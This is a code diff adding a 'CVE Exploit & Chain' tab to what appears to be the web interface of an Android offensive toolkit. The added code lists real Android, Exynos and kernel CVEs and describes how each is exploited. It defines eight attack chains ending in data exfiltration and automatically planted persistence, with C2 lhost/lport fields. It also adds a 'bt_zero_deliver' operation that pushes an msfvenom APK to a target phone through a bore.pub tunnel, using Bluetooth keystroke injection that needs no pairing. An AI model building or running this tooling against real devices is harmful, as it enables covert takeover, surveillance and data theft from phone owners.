@@ -2335,6 +2335,90 @@ input[type=checkbox]:focus{outline:none;}
 .qr-url{color:var(--blue);font-size:0.8rem;word-break:break-all;}
 
 /* ══ UNIFIED PAYLOAD & DELIVERY PANEL ══════════════════════════════════════ */
+/* ── CVE PANEL ────────────────────────────────────────────────── */
+#cve-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
+.cve-toolbar{
+  display:flex;align-items:center;gap:6px;
+  padding:8px 14px;border-bottom:1px solid var(--border);
+  background:var(--bg);flex-shrink:0;
+}
+.cve-title{font-size:0.72rem;font-weight:600;color:var(--white);letter-spacing:0.06em;}
+.cve-tb-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.6rem;padding:3px 9px;cursor:pointer;
+  transition:color var(--t),border-color var(--t);
+}
+.cve-tb-btn:hover{color:var(--white);border-color:var(--border3);}
+.cve-body{flex:1;overflow-y:auto;padding:14px 16px;display:flex;flex-direction:column;gap:0;}
+.cve-subnav{
+  display:flex;gap:0;border-bottom:1px solid var(--border);
+  margin-bottom:14px;flex-shrink:0;
+}
+.cve-snav{
+  font-family:var(--mono);font-size:0.65rem;letter-spacing:0.05em;
+  color:var(--muted);padding:5px 14px;cursor:pointer;
+  border-bottom:2px solid transparent;transition:color var(--t),border-color var(--t);
+}
+.cve-snav:hover{color:var(--grey);}
+.cve-snav.active{color:var(--accent);border-bottom-color:var(--accent);}
+.cve-section{display:flex;flex-direction:column;gap:10px;}
+.cve-section-desc{
+  font-size:0.67rem;color:var(--muted);line-height:1.6;
+  padding:8px 10px;background:var(--bg2);border-left:2px solid var(--border2);
+}
+.cve-section-desc b{color:var(--white);}
+.cve-row{display:flex;align-items:flex-end;gap:10px;flex-wrap:wrap;}
+.cve-run-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.63rem;letter-spacing:0.05em;
+  padding:5px 14px;cursor:pointer;
+  transition:color var(--t),border-color var(--t),box-shadow var(--t);
+  white-space:nowrap;
+}
+.cve-run-btn:hover{color:var(--white);border-color:var(--border3);}
+.cve-run-btn.accent{color:var(--accent);border-color:var(--accent);box-shadow:0 0 8px var(--accent-dim);}
+.cve-run-btn.accent:hover{color:var(--white);box-shadow:0 0 14px var(--accent-dim);}
+.cve-results-area{
+  flex:1;background:var(--bg2);border:1px solid var(--border);
+  padding:10px 12px;overflow-y:auto;max-height:420px;
+  font-size:0.67rem;line-height:1.7;
+}
+.cve-card{
+  border:1px solid var(--border);margin-bottom:8px;padding:8px 10px;
+  background:var(--bg);
+}
+.cve-card:last-child{margin-bottom:0;}
+.cve-card-hdr{display:flex;align-items:center;gap:8px;margin-bottom:4px;}
+.cve-card-id{font-family:var(--mono);font-size:0.72rem;font-weight:600;color:var(--white);}
+.cve-card-status{font-family:var(--mono);font-size:0.58rem;padding:1px 7px;border:1px solid;}
+.cve-card-status.vulnerable{color:var(--red);border-color:var(--red);}
+.cve-card-status.potentially_exploitable{color:#e67828;border-color:#e67828;}
+.cve-card-status.patched{color:var(--muted);border-color:var(--border2);}
+.cve-card-status.not_exploitable{color:var(--muted);border-color:var(--border2);}
+.cve-card-status.likely_patched{color:var(--muted);border-color:var(--border2);}
+.cve-card-status.exploited{color:var(--accent);border-color:var(--accent);}
+.cve-sev{font-family:var(--mono);font-size:0.58rem;padding:1px 6px;margin-left:auto;}
+.cve-sev.CRITICAL{background:rgba(255,50,50,0.12);color:var(--red);border:1px solid var(--red);}
+.cve-sev.HIGH{background:rgba(230,120,40,0.1);color:#e67828;border:1px solid #e67828;}
+.cve-sev.MEDIUM{background:rgba(200,170,50,0.1);color:#c8aa32;border:1px solid #c8aa32);}
+.cve-sev.LOW,.cve-sev.INFO{background:rgba(68,221,255,0.06);color:var(--accent);border:1px solid var(--accent-dim);}
+.cve-card-body{color:var(--muted);font-size:0.64rem;line-height:1.6;}
+.cve-card-body .cve-technique{color:var(--grey);margin-top:3px;}
+.cve-card-body .cve-note{color:var(--blue);margin-top:3px;font-style:italic;}
+.cve-card-body .cve-tool{color:var(--muted);margin-top:2px;}
+.cve-chain-step{
+  display:flex;gap:8px;padding:5px 8px;border-bottom:1px solid var(--border);
+}
+.cve-chain-step:last-child{border-bottom:none;}
+.cve-chain-step .cs-num{color:var(--muted);font-size:0.6rem;flex-shrink:0;width:18px;}
+.cve-chain-step .cs-cve{font-family:var(--mono);font-size:0.65rem;color:var(--white);flex-shrink:0;width:140px;}
+.cve-chain-step .cs-role{font-size:0.58rem;color:var(--blue);flex-shrink:0;width:110px;}
+.cve-chain-step .cs-status{font-size:0.6rem;flex-shrink:0;}
+.cve-chain-step .cs-desc{color:var(--muted);font-size:0.63rem;flex:1;}
+.cve-cve-desc{
+  font-size:0.64rem;color:var(--muted);line-height:1.6;
+  padding:6px 10px;border-left:2px solid var(--accent-dim);margin-top:4px;
+}
 #pd-panel{display:none;flex-direction:column;flex:1;overflow:hidden;min-height:0;}
 .pd-toolbar{
   display:flex;align-items:center;gap:8px;padding:7px 14px;
@@ -2979,6 +3063,7 @@ input[type=checkbox]:focus{outline:none;}
       <div class="tab" onclick="switchTab('adb')">ADB Shell</div>
       <div class="tab" onclick="switchTab('shell')">Shell <span id="shell-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('findings')">Findings <span id="findings-badge" class="badge" style="display:none">0</span></div>
+      <div class="tab" onclick="switchTab('cve')">CVE <span id="cve-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('pd')">P&amp;D <span id="pd-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('msf-console')">MSF <span id="msf-badge" class="badge" style="display:none">●</span></div>
       <div class="tab" onclick="switchTab('files')">Files</div>
@@ -3055,6 +3140,111 @@ input[type=checkbox]:focus{outline:none;}
       </div>
       <div id="f-body"><div id="f-empty" style="padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;">Run an operation — findings populate here automatically.</div></div>
     </div>
+
+    <!-- CVE TAB -->
+    <div id="cve-panel">
+      <div class="cve-toolbar">
+        <span class="cve-title">CVE Exploit &amp; Chain</span>
+        <div style="flex:1"></div>
+        <button class="cve-tb-btn" onclick="cveTab('check')">Check</button>
+        <button class="cve-tb-btn" onclick="cveTab('exploit')">Exploit CVE</button>
+        <button class="cve-tb-btn" onclick="cveTab('chain')">Chain</button>
+      </div>
+
+      <div class="cve-body">
+
+        <!-- SUB-NAV -->
+        <div class="cve-subnav">
+          <span class="cve-snav active" id="csnav-check"   onclick="cveTab('check')">CVE Check</span>
+          <span class="cve-snav"        id="csnav-exploit" onclick="cveTab('exploit')">Exploit CVE</span>
+          <span class="cve-snav"        id="csnav-chain"   onclick="cveTab('chain')">CVE Chain</span>
+        </div>
+
+        <!-- CHECK PANEL -->
+        <div id="cve-section-check" class="cve-section">
+          <div class="cve-section-desc">Scan connected device against all known CVEs. Toggle <b>Show Patched</b> to include CVEs already fixed on the device (marked with patch_status).</div>
+          <div class="cve-row">
+            <div class="field" style="flex:0 0 auto">
+              <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+                <input type="checkbox" id="cve-show-patched"> Show patched CVEs
+              </label>
+            </div>
+            <button class="cve-run-btn accent" onclick="runCveCheck()">▶ Run CVE Check</button>
+          </div>
+          <div id="cve-check-results" class="cve-results-area" style="display:none"></div>
+        </div>
+
+        <!-- EXPLOIT PANEL -->
+        <div id="cve-section-exploit" class="cve-section" style="display:none">
+          <div class="cve-section-desc">Run a targeted exploit check for a specific CVE. The handler reads device info via ADB and reports exploitability status, technique, and tools.</div>
+          <div class="cve-row">
+            <div class="field" style="flex:1">
+              <label>CVE</label>
+              <select id="cve-exploit-select">
+                <option value="CVE-2024-0044">CVE-2024-0044 — Framework run-as sandbox bypass (API 28-34)</option>
+                <option value="CVE-2024-31317">CVE-2024-31317 — Zygote command injection LPE (API 28-34)</option>
+                <option value="CVE-2023-45866">CVE-2023-45866 — Bluetooth HID keystroke injection (no pairing)</option>
+                <option value="CVE-2023-40088">CVE-2023-40088 — Bluetooth UAF zero-click RCE</option>
+                <option value="CVE-2023-24033">CVE-2023-24033 — Exynos baseband RCE (SDP, internet zero-click)</option>
+                <option value="CVE-2023-26072">CVE-2023-26072 — Exynos SIP heap overflow (VoLTE/WiFi Calling)</option>
+                <option value="CVE-2024-43093">CVE-2024-43093 — DocumentsUI path traversal (ITW, API 29-35)</option>
+                <option value="CVE-2025-27363">CVE-2025-27363 — FreeType OOB browser RCE (ITW, all API)</option>
+                <option value="CVE-2023-0266">CVE-2023-0266 — Linux kernel ALSA UAF LPE (kernel 4.4-5.10)</option>
+                <option value="CVE-2024-53104">CVE-2024-53104 — Linux kernel UVC OOB LPE (ITW, all API)</option>
+                <option value="CVE-2023-21492">CVE-2023-21492 — Samsung KASLR pointer leak (Samsung only)</option>
+                <option value="CVE-2024-20017">CVE-2024-20017 — Samsung Exynos WiFi OOB zero-click RCE</option>
+              </select>
+            </div>
+            <div class="field" style="flex:0 0 auto">
+              <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+                <input type="checkbox" id="cve-exploit-show-patched"> Show even if patched
+              </label>
+            </div>
+          </div>
+          <div id="cve-exploit-desc" class="cve-cve-desc"></div>
+          <div class="cve-row" style="margin-top:8px">
+            <button class="cve-run-btn accent" onclick="runCveExploit()">▶ Run Exploit Check</button>
+          </div>
+          <div id="cve-exploit-results" class="cve-results-area" style="display:none"></div>
+        </div>
+
+        <!-- CHAIN PANEL -->
+        <div id="cve-section-chain" class="cve-section" style="display:none">
+          <div class="cve-section-desc">Execute a multi-CVE exploitation chain. Each step runs in order — chain auto-plants persistence when initial_access or zero_click step succeeds.</div>
+          <div class="cve-row">
+            <div class="field" style="flex:2">
+              <label>Chain</label>
+              <select id="cve-chain-select" onchange="updateChainDesc()">
+                <option value="bt_to_root">bt_to_root — BT HID inject → Zygote LPE</option>
+                <option value="sandbox_exfil">sandbox_exfil — run-as bypass → root → data dump</option>
+                <option value="zero_click_full">zero_click_full — BT zero-click → root → exfil</option>
+                <option value="exynos_baseband_rce">exynos_baseband_rce — Exynos baseband → AP pivot → system (zero-click)</option>
+                <option value="wifi_zero_click">wifi_zero_click — Exynos WiFi OOB → KASLR → kernel LPE (zero-click)</option>
+                <option value="freetype_browser">freetype_browser — FreeType browser RCE → exfil → persist (ITW)</option>
+                <option value="kernel_lpe_chain">kernel_lpe_chain — KASLR defeat → ALSA/UVC kernel LPE → root</option>
+                <option value="bt_zero_click_exfil">bt_zero_click_exfil — BT UAF zero-click → cross-app exfil</option>
+              </select>
+            </div>
+          </div>
+          <div id="cve-chain-desc" class="cve-cve-desc"></div>
+          <div class="cve-row" style="margin-top:4px">
+            <div class="field" style="flex:1"><label>lhost (C2)</label><input id="cve-chain-lhost" type="text" placeholder="auto-detect"></div>
+            <div class="field" style="flex:0 0 90px"><label>lport</label><input id="cve-chain-lport" type="text" value="4444"></div>
+            <div class="field" style="flex:0 0 auto">
+              <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
+                <input type="checkbox" id="cve-chain-show-patched"> Show patched steps
+              </label>
+            </div>
+          </div>
+          <div class="cve-row" style="margin-top:8px">
+            <button class="cve-run-btn accent" onclick="runCveChain()">▶ Run Chain</button>
+          </div>
+          <div id="cve-chain-results" class="cve-results-area" style="display:none"></div>
+        </div>
+
+      </div>
+    </div>
+
     <!-- PAYLOAD & DELIVERY TAB — unified mod menu -->
     <div id="pd-panel">
 
@@ -3627,6 +3817,21 @@ const OPS = {
      cli:"secv android zero_click --vector all",
      fields:[
        {n:"vector",p:"all",t:"select",opts:["all","bt","nfc","wifi","media"],label:"Vector"},
+     ]},
+    {id:"bt_zero_deliver", label:"BT zero deliver",
+     desc:"Zero-click APK delivery: generate payload APK → serve via bore WAN tunnel → inject download URL onto target via Bluetooth HID keyboard (CVE-2023-45866, no pairing). Emits WAN URL for manual delivery even without BT. Starts MSF handler.",
+     cli:"secv android bt_zero_deliver --bt-addr XX:XX:XX:XX:XX:XX --lhost LHOST --lport 4444",
+     runLabel:"DELIVER",
+     fields:[
+       {n:"bt_addr",p:"",t:"text",label:"Target BT MAC (XX:XX:XX:XX:XX:XX — blank for URL-only)"},
+       {n:"apk_path",p:"",t:"text",label:"APK path (blank = generate fresh msfvenom APK)"},
+       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
+       {n:"lport",p:"4444",t:"text",label:"LPORT"},
+       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload type"},
+       {n:"serve_port",p:"8890",t:"text",label:"APK HTTP server port"},
+       {n:"bore_server",p:"bore.pub",t:"text",label:"Bore server"},
+       {n:"open_method",p:"browser",t:"select",opts:["browser","adb"],label:"Open method (browser=HID inject, adb=intent)"},
+       {n:"key_delay",p:"0.08",t:"text",label:"Keystroke delay (s)"},
      ]},
   ],
   "Payload & Delivery": [
@@ -5299,6 +5504,231 @@ fetch('/api/workdir').then(r => r.json()).then(d => {
   }
 });
 
+// ── CVE Panel ─────────────────────────────────────────────────────────────────
+
+const _CVE_DESCS = {
+  'CVE-2024-0044':  'Framework run-as sandbox bypass — read any app\'s private data (SharedPrefs, DBs, tokens) without root. Chain with CVE-2024-31317 for full root.',
+  'CVE-2024-31317': 'Zygote command injection via ActivityManager.setProcessMemoryTrimLevel() — arbitrary code exec as system (UID=1000). Root if Magisk present.',
+  'CVE-2023-45866': 'Unauthenticated Bluetooth HID keystroke injection — no pairing required. Inject URL nav + install prompts from ~10m range.',
+  'CVE-2023-40088': 'Bluetooth l2c_rcv_acl_data() use-after-free — zero-click RCE in BT process. Bluetooth must be enabled, no other interaction.',
+  'CVE-2023-24033': 'Exynos baseband RCE via SDP format string — internet-to-baseband, no user interaction. Works over mobile data or WiFi Calling. Exynos only.',
+  'CVE-2023-26072': 'Exynos SIP heap buffer overflow — code execution via VoLTE/WiFi Calling. Part of Project Zero Exynos batch. Exynos only.',
+  'CVE-2024-43093': 'Android DocumentsUI path traversal — cross-app file read via crafted content:// URI. Actively exploited in-the-wild (CISA KEV).',
+  'CVE-2025-27363': 'FreeType OOB write — RCE via malicious web page font. Browser/WebView delivery over WAN. Actively exploited by threat actors.',
+  'CVE-2023-0266':  'Linux kernel ALSA snd_ctl_elem_read() UAF — local privilege escalation to root. Affects kernel 4.4.x through 5.10.x.',
+  'CVE-2024-53104': 'Linux kernel UVC driver OOB write — LPE to root via malicious USB or UVC frame. Actively exploited in-the-wild.',
+  'CVE-2023-21492': 'Samsung world-readable kernel log → extract raw kernel pointers → defeat KASLR. Prerequisite for reliable kernel exploit chaining. Samsung only.',
+  'CVE-2024-20017': 'Samsung Exynos WLAN driver (dhd.ko) OOB write — zero-click kernel RCE via crafted 802.11 management frame. WiFi range. Samsung Exynos only.',
+};
+
+const _CHAIN_DESCS = {
+  'bt_to_root':          'CVE-2023-45866 (BT HID inject) → CVE-2024-31317 (Zygote LPE). Bluetooth proximity initial access escalating to system-level code execution.',
+  'sandbox_exfil':       'CVE-2024-0044 (run-as bypass) → CVE-2024-31317 (Zygote root) → data dump. Full data exfiltration chain requiring only an installed APK.',
+  'zero_click_full':     'CVE-2023-45866 (BT zero-click) → CVE-2024-31317 (root) → CVE-2024-0044 (exfil). No user interaction beyond BT enabled.',
+  'exynos_baseband_rce': 'CVE-2023-24033 (baseband RCE) → CVE-2023-26072 (SIP overflow) → CVE-2024-31317 (system). Internet-to-baseband zero-click. Exynos only.',
+  'wifi_zero_click':     'CVE-2024-20017 (WiFi OOB) → CVE-2023-21492 (KASLR defeat) → CVE-2023-0266 (ALSA LPE). Zero-click WiFi proximity → root. Samsung Exynos only.',
+  'freetype_browser':    'CVE-2025-27363 (FreeType browser RCE) → CVE-2024-43093 (DocumentsUI exfil) → CVE-2024-31317 (persist). WAN delivery via malicious link.',
+  'kernel_lpe_chain':    'CVE-2023-21492 (KASLR) → CVE-2023-0266 (ALSA LPE) / CVE-2024-53104 (UVC LPE). Kernel privilege escalation without Magisk. Samsung only for KASLR step.',
+  'bt_zero_click_exfil': 'CVE-2023-40088 (BT UAF zero-click) → CVE-2024-0044 (run-as exfil) → CVE-2024-43093 (DocsUI exfil). All-wireless zero-click full exfiltration.',
+};
+
+function cveTab(name) {
+  document.querySelectorAll('.cve-snav').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.cve-section').forEach(el => el.style.display = 'none');
+  const nav = document.getElementById('csnav-' + name);
+  const sec = document.getElementById('cve-section-' + name);
+  if (nav) nav.classList.add('active');
+  if (sec) sec.style.display = 'flex';
+}
+
+function updateExploitDesc() {
+  const sel = document.getElementById('cve-exploit-select');
+  const desc = document.getElementById('cve-exploit-desc');
+  if (!sel || !desc) return;
+  desc.textContent = _CVE_DESCS[sel.value] || '';
+  sel.onchange = updateExploitDesc;
+}
+
+function updateChainDesc() {
+  const sel = document.getElementById('cve-chain-select');
+  const desc = document.getElementById('cve-chain-desc');
+  if (!sel || !desc) return;
+  desc.textContent = _CHAIN_DESCS[sel.value] || '';
+  sel.onchange = updateChainDesc;
+}
+
+function _cveStatusClass(s) {
+  if (!s) return '';
+  const m = { 'potentially_exploitable': 'potentially_exploitable', 'exploited': 'exploited',
+               'patched': 'patched', 'likely_patched': 'likely_patched',
+               'not_exploitable': 'not_exploitable', 'vulnerable': 'vulnerable' };
+  return m[s] || '';
+}
+
+function _cveSevClass(s) {
+  return (s || '').toUpperCase();
+}
+
+function renderCveCard(v) {
+  const statusCls = _cveStatusClass(v.status || v.patch_status);
+  const sevCls    = _cveSevClass(v.severity);
+  const cveId     = v.type || v.cve || '';
+  const statusLbl = v.patch_status === 'patched' ? 'patched' : (v.status || '');
+  const technique = v.technique || '';
+  const note      = v.note || v.note_text || '';
+  const tool      = v.tool || '';
+  return `<div class="cve-card">
+    <div class="cve-card-hdr">
+      <span class="cve-card-id">${esc(cveId)}</span>
+      <span class="cve-card-status ${statusCls}">${esc(statusLbl)}</span>
+      <span class="cve-sev ${sevCls}">${esc(v.severity||'')}</span>
+    </div>
+    <div class="cve-card-body">
+      <div>${esc(v.description || v.desc || '')}</div>
+      ${technique ? `<div class="cve-technique">↳ ${esc(technique)}</div>` : ''}
+      ${tool      ? `<div class="cve-tool">tool: ${esc(tool)}</div>` : ''}
+      ${note      ? `<div class="cve-note">${esc(note)}</div>` : ''}
+      ${v.attack_vector ? `<div style="color:var(--muted);font-size:0.62rem;margin-top:2px;">vector: ${esc(v.attack_vector)}</div>` : ''}
+      ${v.poc ? `<div style="color:var(--blue);font-size:0.61rem;margin-top:2px;">poc: ${esc(v.poc)}</div>` : ''}
+    </div>
+  </div>`;
+}
+
+function renderCveCheckResults(data) {
+  const el = document.getElementById('cve-check-results');
+  if (!el) return;
+  const vulns = data.vulnerabilities || [];
+  if (!vulns.length) {
+    el.innerHTML = '<div style="color:var(--muted);padding:10px 0;">No CVEs matched. Try enabling "Show patched CVEs" or ensure device is connected.</div>';
+    el.style.display = '';
+    return;
+  }
+  const vuln_c  = vulns.filter(v => v.patch_status !== 'patched').length;
+  const patch_c = vulns.filter(v => v.patch_status === 'patched').length;
+  let html = `<div style="color:var(--muted);font-size:0.63rem;margin-bottom:8px;">`;
+  html += `<span style="color:var(--red)">${vuln_c} vulnerable</span>`;
+  if (patch_c) html += `  <span style="color:var(--border3)">${patch_c} patched</span>`;
+  html += `  total: ${vulns.length}</div>`;
+  for (const v of vulns) html += renderCveCard(v);
+  el.innerHTML = html;
+  el.style.display = '';
+  const badge = document.getElementById('cve-badge');
+  if (badge) { badge.textContent = vuln_c; badge.style.display = vuln_c ? '' : 'none'; }
+}
+
+function runCveCheck() {
+  const serial      = document.getElementById('dev-select').value;
+  const showPatched = document.getElementById('cve-show-patched').checked;
+  const el          = document.getElementById('cve-check-results');
+  el.innerHTML = '<div style="color:var(--muted);padding:8px 0;">Running CVE check…</div>';
+  el.style.display = '';
+  const params = { operation: 'vuln_scan', show_patched: showPatched };
+  if (serial) params.device = serial;
+  fetch('/api/run', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ target: serial || 'device', params })
+  }).then(r => r.json()).then(d => {
+    if (!d.ok) { el.innerHTML = `<div style="color:var(--red);">Error: ${esc(d.error||'unknown')}</div>`; return; }
+    const sid = d.session_id;
+    const poll = setInterval(() => {
+      fetch(`/api/session/${sid}`).then(r => r.json()).then(sd => {
+        if (sd.status === 'running') return;
+        clearInterval(poll);
+        renderCveCheckResults(sd);
+      }).catch(() => clearInterval(poll));
+    }, 1200);
+  }).catch(e => { el.innerHTML = `<div style="color:var(--red);">Fetch error: ${esc(String(e))}</div>`; });
+}
+
+function runCveExploit() {
+  const serial      = document.getElementById('dev-select').value;
+  const cve         = document.getElementById('cve-exploit-select').value;
+  const showPatched = document.getElementById('cve-exploit-show-patched').checked;
+  const el          = document.getElementById('cve-exploit-results');
+  el.innerHTML = `<div style="color:var(--muted);padding:8px 0;">Running ${esc(cve)} exploit check…</div>`;
+  el.style.display = '';
+  const params = { operation: 'exploit_cve', cve, show_patched: showPatched };
+  if (serial) params.device = serial;
+  fetch('/api/run', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ target: serial || 'device', params })
+  }).then(r => r.json()).then(d => {
+    if (!d.ok) { el.innerHTML = `<div style="color:var(--red);">Error: ${esc(d.error||'unknown')}</div>`; return; }
+    const sid = d.session_id;
+    const poll = setInterval(() => {
+      fetch(`/api/session/${sid}`).then(r => r.json()).then(sd => {
+        if (sd.status === 'running') return;
+        clearInterval(poll);
+        const findings = (sd.findings || []).filter(f => f.category === 'exploit_cve');
+        if (!findings.length) {
+          el.innerHTML = `<div style="color:var(--muted);">No exploit finding returned. Check terminal for details.</div>`;
+          return;
+        }
+        let html = '';
+        for (const f of findings) html += renderCveCard({...f, type: f.cve || cve, description: f.note || f.technique || ''});
+        el.innerHTML = html;
+      }).catch(() => clearInterval(poll));
+    }, 1200);
+  }).catch(e => { el.innerHTML = `<div style="color:var(--red);">Fetch error: ${esc(String(e))}</div>`; });
+}
+
+function runCveChain() {
+  const serial      = document.getElementById('dev-select').value;
+  const chain       = document.getElementById('cve-chain-select').value;
+  const lhost       = document.getElementById('cve-chain-lhost').value.trim();
+  const lport       = document.getElementById('cve-chain-lport').value.trim() || '4444';
+  const showPatched = document.getElementById('cve-chain-show-patched').checked;
+  const el          = document.getElementById('cve-chain-results');
+  el.innerHTML = `<div style="color:var(--muted);padding:8px 0;">Running chain: ${esc(chain)}…</div>`;
+  el.style.display = '';
+  const params = { operation: 'cve_chain', chain, lport, show_patched: showPatched };
+  if (lhost)  params.lhost  = lhost;
+  if (serial) params.device = serial;
+  fetch('/api/run', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ target: serial || 'device', params })
+  }).then(r => r.json()).then(d => {
+    if (!d.ok) { el.innerHTML = `<div style="color:var(--red);">Error: ${esc(d.error||'unknown')}</div>`; return; }
+    const sid = d.session_id;
+    const poll = setInterval(() => {
+      fetch(`/api/session/${sid}`).then(r => r.json()).then(sd => {
+        if (sd.status === 'running') return;
+        clearInterval(poll);
+        const chainResult = (sd.findings || []).find(f => f.category === 'cve_chain');
+        if (!chainResult) {
+          el.innerHTML = `<div style="color:var(--muted);">No chain result. Check terminal.</div>`;
+          return;
+        }
+        const steps  = chainResult.steps || [];
+        const access = chainResult.access_level || 'none';
+        const ok     = chainResult.success;
+        let html = `<div style="margin-bottom:8px;font-size:0.65rem;">`;
+        html += `chain: <b style="color:var(--white)">${esc(chain)}</b>  `;
+        html += `access: <b style="color:${ok?'var(--accent)':'var(--red)'}">${esc(access)}</b>  `;
+        html += `${ok ? '<span style="color:var(--accent)">✓ complete</span>' : `<span style="color:var(--red)">broken at: ${esc(chainResult.chain_broken_at||'?')}</span>`}`;
+        html += `</div><div class="cve-card" style="padding:0">`;
+        for (let i = 0; i < steps.length; i++) {
+          const s   = steps[i];
+          const st  = s.status || '';
+          const ok2 = ['potentially_exploitable','exploited','success'].includes(st);
+          html += `<div class="cve-chain-step">
+            <span class="cs-num">${i+1}.</span>
+            <span class="cs-cve">${esc(s.cve||'')}</span>
+            <span class="cs-role" style="color:var(--blue)">${esc(s.role||'')}</span>
+            <span class="cs-status" style="color:${ok2?'var(--accent)':st==='patched'?'var(--muted)':'var(--red)'}">${ok2?'✓':st==='patched'?'~':'✗'} ${esc(st)}</span>
+            <span class="cs-desc">${esc(s.desc||s.note||'')}</span>
+          </div>`;
+        }
+        html += `</div>`;
+        if (chainResult.auto_persist) {
+          html += `<div style="color:var(--accent);font-size:0.62rem;margin-top:6px;">↳ persistence planted</div>`;
+        }
+        el.innerHTML = html;
+      }).catch(() => clearInterval(poll));
+    }, 1200);
+  }).catch(e => { el.innerHTML = `<div style="color:var(--red);">Fetch error: ${esc(String(e))}</div>`; });
+}
+
 // ── Setup/Deps ────────────────────────────────────────────────────────────────
 function loadSettings() {
   fetch('/api/settings').then(r => r.json()).then(d => {
@@ -6393,16 +6823,17 @@ function toggleSidebar() {
 }
 
 function switchTab(tab) {
-  const names = ['terminal','adb','shell','findings','pd','msf-console','files','setup','c2','live'];
+  const names = ['terminal','adb','shell','findings','cve','pd','msf-console','files','setup','c2','live'];
   document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', names[i]===tab));
   // self-contained tabs get full height — hide the params panel
-  const fullHeight = tab === 'pd' || tab === 'msf-console';
+  const fullHeight = tab === 'pd' || tab === 'msf-console' || tab === 'cve';
   const pp = document.getElementById('params-panel');
   if (pp) pp.style.display = fullHeight ? 'none' : '';
   document.getElementById('terminal-wrap').style.display      = tab==='terminal'    ? 'flex':'none';
   document.getElementById('adb-console').style.display        = tab==='adb'         ? 'flex':'none';
   document.getElementById('shell-panel').style.display        = tab==='shell'       ? 'flex':'none';
   document.getElementById('findings-panel').style.display     = tab==='findings'    ? 'flex':'none';
+  document.getElementById('cve-panel').style.display          = tab==='cve'         ? 'flex':'none';
   document.getElementById('pd-panel').style.display           = tab==='pd'          ? 'flex':'none';
   document.getElementById('msf-console-panel').style.display  = tab==='msf-console' ? 'flex':'none';
   document.getElementById('files-panel').style.display        = tab==='files'       ? 'flex':'none';
@@ -6416,6 +6847,7 @@ function switchTab(tab) {
   if (tab === 'setup')       { loadDeps(); loadKeystoreInfo(); }
   if (tab === 'c2')          { checkC2Status(); }
   if (tab === 'live')        { onLiveTabOpen(); }
+  if (tab === 'cve')         { updateChainDesc(); updateExploitDesc(); }
 }
 
 // ── ADB Console ───────────────────────────────────────────────────────────────
